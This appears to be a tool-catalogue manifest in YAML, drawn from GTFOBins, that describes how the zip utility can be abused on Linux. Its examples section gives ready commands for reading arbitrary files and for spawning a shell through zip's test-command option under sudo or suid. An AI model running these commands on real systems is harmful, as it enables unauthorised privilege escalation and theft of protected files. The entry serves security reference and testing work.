---
id: compression-zip-zip
namespace: compression:zip:zip
name: zip
description: Compress files into ZIP archives; can read files and spawn shells via
  test command.
author: GTFOBins
version: 1.0.0
capabilities:
- system.file.read
- security.privilege-escalation.shell
platforms:
- linux
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
- arm64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - shell-access
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: none
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: none
  disk_io: low
allowed-tools:
- zip
parameters: []
features:
- compression
- file-system
- interactive
- local
- process-manip
- requires-root
execution:
  template: zip
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Read arbitrary files (sudo, suid, unprivileged)
  command: 'zip /path/to/temp-file /path/to/input-file

    unzip -p /path/to/temp-file'
- description: Spawn an interactive shell (sudo, suid, unprivileged)
  command: 'zip /path/to/temp-file /etc/hosts -T -TT ''/bin/sh #'''
references:
- label: GTFOBins
  url: https://gtfobins.github.io/gtfobins/zip/
techniques:
- collection
- privilege-escalation
- execution
install:
- method: apt
  package_name: zip
  commands:
  - apt-get install -y zip
---

# zip

zip is a command-line utility. Compress files into ZIP archives; can also read files and spawn shells; can also read arbitrary files, spawn an interactive shell.
